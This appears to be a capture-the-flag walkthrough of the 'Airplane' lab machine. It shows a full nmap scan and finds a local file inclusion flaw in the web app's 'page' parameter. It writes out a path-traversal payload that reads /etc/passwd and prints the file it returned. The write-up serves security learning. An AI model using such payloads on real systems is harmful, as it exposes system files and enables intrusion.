
# Airplane

Nmap scan

```shell
# Nmap 7.94SVN scan initiated Mon Jun 10 16:36:29 2024 as: nmap -sCV -p- --min-rate=1000 -T4 -oN scan -vv 10.10.84.134
Nmap scan report for 10.10.84.134
Host is up, received echo-reply ttl 63 (0.13s latency).
Scanned at 2024-06-10 16:36:29 WAT for 249s
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE  REASON         VERSION
22/tcp   open  ssh      syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b8:64:f7:a9:df:29:3a:b5:8a:58:ff:84:7c:1f:1a:b7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCuy7X5e34bStIhDkjJIcUT3kqFt9fHoI/q8AaCCH6HqgOz2HC5GdcDiBN8W6JMoRIIDJO/9FHiFE+MNtESwOP9J+S348GOhUIsVhDux7caJiyJQElrKxXJgxA7DNUvVJNBUchhgGhFv/qCNbUYF8+uaTYc0o/HtvgVw+t/bxS6EO+OlAOpyAjUP5XZjGTyc4n4uCc8mYW6aQHXZR0t5lMaKkNJzXl5+kHxxxnKci6+Ao8vrlKshgIq25NErSqoeTs/wgBcPMkr5r++emLH+rDwmjrTvwrHb2/bKKUenvnbf9AZXbcN52nGthVi95kP6HaDGijXULjrRt2GCul99OmNhEQxJNtLmUnxpxA9ZhBEzMYe3z5EeIbLuA+E9yFSrR6nq2pagC2/qvVMJSAzD749AbwjtbcL8MOf+7DCT+SATY9VxBqtKep/9PDolKi5+prGH6gzfjCkj5YaFS2CvJeGlF/B1XBzd1ccm43Lc4Ad/F4kvQWwkHmpL38kDy4eWCE=
|   256 ad:61:3e:c7:10:32:aa:f1:f2:28:e2:de:cf:84:de:f0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLYVoN15q7ky/IIo3VNrL35GRCpppImVs7x+PPFRlqO+VcfQ8C+MR2zVEFS0wosQWQFXaCZiInQhWz9swfKN6J8=
|   256 a9:d8:49:aa:ee:de:c4:48:32:e4:f1:9e:2a:8a:67:f0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFIB0hj2IqNazZojgwv0jJr+ZnOF1RCzykZ7W3jKsuCb
6048/tcp open  x11?     syn-ack ttl 63
8000/tcp open  http-alt syn-ack ttl 63 Werkzeug/3.0.2 Python/3.8.10
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/3.0.2 Python/3.8.10
|     Date: Mon, 10 Jun 2024 15:37:51 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.1 302 FOUND
|     Server: Werkzeug/3.0.2 Python/3.8.10
|     Date: Mon, 10 Jun 2024 15:37:45 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 269
|     Location: http://airplane.thm:8000/?page=index.html
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to the target URL: <a href="http://airplane.thm:8000/?page=index.html">http://airplane.thm:8000/?page=index.html</a>. If not, click the link.
|   Socks5: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request syntax ('
|     ').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
|_http-server-header: Werkzeug/3.0.2 Python/3.8.10
|_http-title: Did not follow redirect to http://airplane.thm:8000/?page=index.html
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.94SVN%I=7%D=6/10%Time=66671DCA%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,1F3,"HTTP/1\.1\x20302\x20FOUND\r\nServer:\x20Werkzeug/3\.0\
SF:.2\x20Python/3\.8\.10\r\nDate:\x20Mon,\x2010\x20Jun\x202024\x2015:37:45
SF:\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Leng
SF:th:\x20269\r\nLocation:\x20http://airplane\.thm:8000/\?page=index\.html
SF:\r\nConnection:\x20close\r\n\r\n<!doctype\x20html>\n<html\x20lang=en>\n
SF:<title>Redirecting\.\.\.</title>\n<h1>Redirecting\.\.\.</h1>\n<p>You\x2
SF:0should\x20be\x20redirected\x20automatically\x20to\x20the\x20target\x20
SF:URL:\x20<a\x20href=\"http://airplane\.thm:8000/\?page=index\.html\">htt
SF:p://airplane\.thm:8000/\?page=index\.html</a>\.\x20If\x20not,\x20click\
SF:x20the\x20link\.\n")%r(FourOhFourRequest,184,"HTTP/1\.1\x20404\x20NOT\x
SF:20FOUND\r\nServer:\x20Werkzeug/3\.0\.2\x20Python/3\.8\.10\r\nDate:\x20M
SF:on,\x2010\x20Jun\x202024\x2015:37:51\x20GMT\r\nContent-Type:\x20text/ht
SF:ml;\x20charset=utf-8\r\nContent-Length:\x20207\r\nConnection:\x20close\
SF:r\n\r\n<!doctype\x20html>\n<html\x20lang=en>\n<title>404\x20Not\x20Foun
SF:d</title>\n<h1>Not\x20Found</h1>\n<p>The\x20requested\x20URL\x20was\x20
SF:not\x20found\x20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\x2
SF:0URL\x20manually\x20please\x20check\x20your\x20spelling\x20and\x20try\x
SF:20again\.</p>\n")%r(Socks5,213,"<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C
SF://DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x20\x20\x20\x20\"http://
SF:www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x20\x20\x20\x20<head>\n\
SF:x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equiv=\"Content-Type\"\x20
SF:content=\"text/html;charset=utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<
SF:title>Error\x20response</title>\n\x20\x20\x20\x20</head>\n\x20\x20\x20\
SF:x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20response</h1>\n
SF:\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>\n\x20\x20\
SF:x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20syntax\x20\('\\
SF:x05\\x04\\x00\\x01\\x02\\x80\\x05\\x01\\x00\\x03'\)\.</p>\n\x20\x20\x20
SF:\x20\x20\x20\x20\x20<p>Error\x20code\x20explanation:\x20HTTPStatus\.BAD
SF:_REQUEST\x20-\x20Bad\x20request\x20syntax\x20or\x20unsupported\x20metho
SF:d\.</p>\n\x20\x20\x20\x20</body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jun 10 16:40:38 2024 -- 1 IP address (1 host up) scanned in 248.94 seconds

```

Website on port 8000

![[attachments/Pasted image 20240610164552.png]]

Insert domain into `/etc/hosts` file

![[attachments/Pasted image 20240610164642.png]]

![[attachments/Pasted image 20240610164850.png]]

URL looks to be vulnerable to LFI (local file inclusion). The parameter  page is vulnerable

Testing various lfi payloads.

![[attachments/Pasted image 20240610171509.png]]

This works

```
../../../../../../../etc/passwd
```

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:109:116:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:110:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:111:117:RealtimeKit,,,:/proc:/usr/sbin/nologin
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
cups-pk-helper:x:113:120:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
avahi:x:115:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
saned:x:117:123::/var/lib/saned:/usr/sbin/nologin
nm-openvpn:x:118:124:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
hplip:x:119:7:HPLIP system user,,,:/run/hplip:/bin/false
whoopsie:x:120:125::/nonexistent:/bin/false
colord:x:121:126:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
fwupd-refresh:x:122:127:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
geoclue:x:123:128::/var/lib/geoclue:/usr/sbin/nologin
pulse:x:124:129:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
gnome-initial-setup:x:125:65534::/run/gnome-initial-setup/:/bin/false
gdm:x:126:131:Gnome Display Manager:/var/lib/gdm3:/bin/false
sssd:x:127:132:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
carlos:x:1000:1000:carlos,,,:/home/carlos:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
hudson:x:1001:1001::/home/hudson:/bin/bash
sshd:x:128:65534::/run/sshd:/usr/sbin/nologi
```